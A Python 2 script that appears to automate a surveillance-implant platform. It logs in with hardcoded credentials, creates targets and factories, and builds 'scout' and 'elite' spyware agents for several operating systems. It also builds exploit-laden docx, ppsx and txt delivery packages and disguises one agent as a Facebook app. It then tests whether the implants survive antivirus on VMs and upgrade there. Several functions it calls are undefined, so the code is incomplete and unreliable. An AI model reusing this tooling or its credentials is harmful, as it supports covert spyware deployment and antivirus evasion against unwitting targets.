import os
import re
import time
import socket
import urllib2
import argparse
import traceback

from urllib2 import HTTPError
from time import sleep

from rcs_client import Rcs_client

internet_checked = False

class connection:
    host = ""
    user = "avmonitor"
    passwd = "avmonitorp123"

    def __enter__(self):
        print "DBG login %s@%s" % (self.user, self.host)
        self.conn = Rcs_client(self.host, self.user, self.passwd)
        self.conn.login()
        return self.conn

    def __exit__(self, type, value, traceback):
        #print "DBG logout"
        self.conn.logout()

class AVAgent:
    def __init__(self, backend, frontend=None, platform='windows', kind='silent', hostname='noav', ftype='desktop', blacklist=[]):
        self.kind = kind
        self.host = (backend, frontend)
        self.hostname = hostname
        self.blacklist = blacklist
        self.platform = platform
        self.ftype = ftype
        print "DBG blacklist: %s" % self.blacklist

    def _delete_targets(self, operation):
        with connection() as c:
            operation_id, group_id = c.operation(operation)
            print "operation_id: %s" % operation_id
            targets = c.targets(operation_id)
            for t_id in targets:
                print "- Delete target: %s" % t_id
                c.target_delete(t_id) 

    def _create_new_factory(self, operation, target, factory, config):
        with connection() as c:
            operation_id, group_id = c.operation(operation)
            print "DBG type: ", self.ftype, " operation: " , operation, " target: ", target, " factory: ", factory

            # gets all the target with our name in an operation
            targets = c.targets(operation_id, target)

            if len(targets) > 0:
                # keep only one target
                for t in targets[1:]:
                    c.target_delete(t)    

                target_id = targets[0]
                
                agents = c.agents( target_id )

                for agent_id, ident, name in agents:
                    print "DBG   ", agent_id, ident, name
                    if name.startswith(factory):
                        print "- Delete instance: %s %s" % (ident, name)
                        c.instance_delete(agent_id)
            else:
                print "- Create target: %s" % target
                target_id = c.target_create(operation_id, target, 'made by vmavtest at %s' % time.ctime())
            factory_id, ident = c.factory_create(operation_id, target_id, self.ftype, factory, 'made by vmavtestat at %s' % time.ctime())

            with open(config) as f:
                conf = f.read()

            conf =  re.sub(r'"host": ".*"',r'"host": "%s"' % self.host[1], conf)
            c.factory_add_config(factory_id, conf)

            with open('build/config.actual.json','wb') as f:
                f.write(conf)

            return (target, factory_id, ident)

    def _build_agent(self, factory, melt = None, demo = False, tries = 0):
        with connection() as c:
            params = {}
            params['blackberry'] = {'platform': 'blackberry',
                'binary': {'demo': demo},
                'melt': {'appname': 'facebook',
                    'name': 'Facebook Application',
                    'desc': 'Applicazione utilissima di social network',
                    'vendor': 'face inc',
                    'version': '1.2.3'},
                'package': {'type': 'local'}}
                
            params['windows'] = { 'platform': 'windows',
                'binary': { 'demo' : demo, 'admin' : False},
                'melt' : {'scout' : True, 'admin' : False, 'bit64' : True, 'codec' : True },
                'sign' : {}
            }
            params['android'] = { 'platform': 'android',
                'binary': { 'demo' : demo, 'admin' : False},
                'sign' : {},
                'melt' : {}
            }
            params['linux'] = { 'platform': 'linux',
                'binary': { 'demo' : demo, 'admin' : False},
                'melt' : {}
            }
            params['osx'] = {'platform': 'osx',
                'binary': {'demo': demo, 'admin': True},
                'melt' : {}
            }
            params['ios'] = {'platform': 'ios',
                'binary': {'demo': demo },
                'melt' : {}
            }

            params['exploit'] = {"generate": 
                {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit":"HT-2012-001", 
                "melt":{"demo":False, "scout":True, "admin":False}}, "platform":"exploit", "deliver": {"user":"USERID"},
                "melt":{"combo":"txt", "filename":"example.txt", "appname":"agent.exe", 
                "input":"000"}, "factory":{"_id":"000"}
            }

            params['exploit_docx'] = {"generate": 
                    {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit":"HT-2013-002", 
                    "melt":{"demo":False, "scout":True, "admin":False}}, 
                "platform":"exploit", "deliver": {"user":"USERID"},
                "melt":{"filename":"example.docx", "appname":"APPNAME", "input":"000", "url":"http://HOSTNAME/APPNAME" }, "factory":{"_id":"000"}
            }
            params['exploit_ppsx'] = {"generate": 
                    {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit":"HT-2013-003", 
                    "melt":{"demo":False, "scout":True, "admin":False}}, 
                "platform":"exploit", "deliver": {"user":"USERID"},
                "melt":{"filename":"example.ppsx", "appname":"APPNAME", "input":"000", "url":"http://HOSTNAME/APPNAME" }, "factory":{"_id":"000"}
            }
            params['iso'] = {'platform': 'iso',
				'generate': {'platforms': ['osx', 'windows'],
					'binary': {'demo': 'DEMO', 'admin': False},
					'melt': {'admin': False}
			 	}
			}
            param = params[self.platform]

            try:
                
                filename = 'build/%s/dvd_offline_%s.iso' % (self.platform, self.hostname)
                if os.path.exists(filename):
                    os.remove(filename)

                r = c.build(factory, param, filename)

                # CHECK FOR DELETED FILES

                print "+ SUCCESS SCOUT BUILD"
                return filename
            except HTTPError as err:
                print "DBG trace %s" % traceback.format_exc()
                if tries <= 3:
                    tries+=1
                    print "DBG problem building scout. tries number %s" % tries
                    return self._build_agent(factory, melt, demo, tries)
                else:
                    print "+ ERROR SCOUT BUILD AFTER %s BUILDS" % tries
                    raise err
            except Exception, e:
                print "DBG trace %s" % traceback.format_exc()
                print "+ ERROR SCOUT BUILD EXCEPTION RETRIEVED"
                raise e

    def server_errors(self):
        with connection() as c:
            return c.server_status()['error']

    def create_user_machine(self):
        print "create_user_machine"
        privs = ['ADMIN','ADMIN_USERS','ADMIN_OPERATIONS','ADMIN_TARGETS','ADMIN_AUDIT','ADMIN_LICENSE','SYS','SYS_FRONTEND','SYS_BACKEND','SYS_BACKUP','SYS_INJECTORS','SYS_CONNECTORS','TECH','TECH_FACTORIES','TECH_BUILD','TECH_CONFIG','TECH_EXEC','TECH_UPLOAD','TECH_IMPORT','TECH_NI_RULES','VIEW','VIEW_ALERTS','VIEW_FILESYSTEM','VIEW_EDIT','VIEW_DELETE','VIEW_EXPORT','VIEW_PROFILES'] 
        user_name = "avmonitor_%s" % self.hostname
        connection.user = user_name

        user_exists = False
        try:
            with connection() as c:
                print "LOGIN SUCCESS"
                user_exists = True
        except:
            pass

        if not user_exists:
            connection.user = "avmonitor"
            with connection() as c:
                op, group_id = c.operation('AVMonitor')
                c.user_create( user_name, connection.passwd, privs, group_id)
        connection.user = user_name
        return True

    def execute_elite(self):
        """ build scout and upgrade it to elite """
        instance = self.execute_scout()

        if not instance:
            print "- exiting execute_elite because did't sync"
            return

        print "- Try upgrade to elite"
        upgradable = self._upgrade_elite(instance)
        
        print "DBG %s in %s" % (self.hostname, self.blacklist)
        if not upgradable:
            if self.hostname in self.blacklist:
                result = "+ SUCCESS ELITE BLACKLISTED"
                print result
            else:
                result = "+ FAILED ELITE UPGRADE"
                print result
            return
        else:
            if self.hostname in self.blacklist:
                result = "+ FAILED ELITE BLACKLISTED"
                print result
                return

        print "- Elite, Wait for 25 minutes: %s" % time.ctime() 
        sleep(25 * 60)
        
        elite = self._check_elite( instance )
        if elite:
            result = "+ SUCCESS ELITE INSTALL"
            print result
            print "- Elite, wait for 4 minute then uninstall: %s" % time.ctime() 
            sleep(60 * 2)
            self._uninstall(instance)
            sleep(60 * 2)
            result = "+ SUCCESS ELITE UNINSTALLED"
            print result
        else:
            output = self._list_processes()
            print output
            result = "+ FAILED ELITE INSTALL"
            print result

        print "- Result: %s" % elite
        print "- sending Results to Master"

    def execute_scout(self):
        """ build and execute the  """
        factory_id, ident, exe = self.execute_pull()

        self._execute_build(exe)

        print "- Scout, Wait for 6 minutes: %s" % time.ctime() 
        sleep(random.randint(300, 400))

        for tries in range(1,10):
            print "- Scout, Trigger sync for 30 seconds, try %s" % tries
            self._trigger_sync(timeout = 30)

            print "- Scout, wait for 1 minute: %s" % time.ctime() 
            sleep(60 * 1)

            instance = self._check_instance( ident )
            if instance:
                break;

            for i in range(10):
                self._click_mouse(100 + i ,0)

        if not instance:
            output = self._list_processes()
            print output
        print "- Result: %s" % instance
        return instance


    def execute_pull(self):
        """ build and execute the  """
        
        print "- Host: %s %s\n" % (self.hostname, time.ctime())
        operation = 'AVMonitor'
#        target = 'VM_%s' % self.hostname
        target = 'VM_avast'
        # desktop_exploit_melt, desktop_scout_
#        factory ='%s_%s_%s_%s' % (self.hostname, self.ftype, self.platform, self.kind)
        factory ='%s_%s_%s_%s' % ("avast", self.ftype, self.platform, self.kind)
        config = "assets/config_%s.json" % self.ftype

        if not os.path.exists('build'):
            os.mkdir('build')
        if not os.path.exists('build/%s' % self.platform):
            os.mkdir('build/%s' % self.platform)
        target_id, factory_id, ident = self._create_new_factory( operation, target, factory, config)

        print "- Built"

        meltfile = None
        if self.kind == 'melt':
            if self.platform == 'exploit_docx':
                meltfile = 'assets/meltexploit.docx'
            elif self.platform == 'exploit_ppsx':
                meltfile = 'assets/meltexploit.ppsx'
            elif self.platform == 'exploit':
                meltfile = 'assets/meltexploit.txt'
            else:
                meltfile = 'assets/meltapp.exe'

        exe = self._build_agent( factory_id, meltfile )

        return factory_id, ident, exe

def execute_agent(args):
    """ starts the vm and execute elite,scout or pull, depending on the level """
    global internet_checked

    ftype = args.platform_type["windows"]
    print "DBG ftype: %s" % ftype
    print "- Server: %s/%s %s" % (args.backend,args.frontend, "silent")

    vmavtest = AVAgent( args.backend, args.frontend, "iso", "silent", args.hostname, ftype, [] )

    if vmavtest.create_user_machine():
        print "+ SUCCESS USER CONNECT"
        if not vmavtest.server_errors():
            print "+ SUCCESS SERVER CONNECT"
            vmavtest.execute_pull()
        else:
            print "+ ERROR SERVER ERRORS"
    else:
        print "+ ERROR USER CREATE"

def main():
    platform_type = {}
    platforms = [ "osx", "windows" ]

    for v in platforms:
        platform_type[v]='desktop'

    parser = argparse.ArgumentParser(description='AVMonitor avtest.')

    #parser.add_argument('-p', '--platform', default='windows')
    parser.add_argument('-n', '--hostname', required=True)
    parser.add_argument('-b', '--backend', required=True)
    parser.add_argument('-f', '--frontend', required=True)
    parser.add_argument('-v', '--verbose', action='store_true', default=False, help="Verbose")
    parser.set_defaults(platform_type =  platform_type)

    args = parser.parse_args()

    connection.host = args.backend
    print args

    execute_agent(args)

if __name__ == "__main__":
	main()
